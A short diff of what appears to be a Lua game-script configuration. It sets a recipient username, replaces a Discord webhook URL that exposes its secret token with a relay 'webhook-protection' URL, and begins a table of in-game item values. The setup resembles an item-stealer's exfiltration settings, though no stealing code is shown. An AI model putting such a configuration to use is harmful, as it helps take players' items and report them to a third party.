@@ -1,5 +1,5 @@
 userName = "pro199064"
-webHook = "https://discord.com/api/webhooks/1340718451550978100/g8dCvFrQ3wWi9ByRkbrLnQ2dD3dcBce9arVI5SD5r3i1izj6NCMkod-muCNj89RjM_SY"
+webHook = "https://webhook-protection.com/post?uniqueid=ad7b2cf5"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
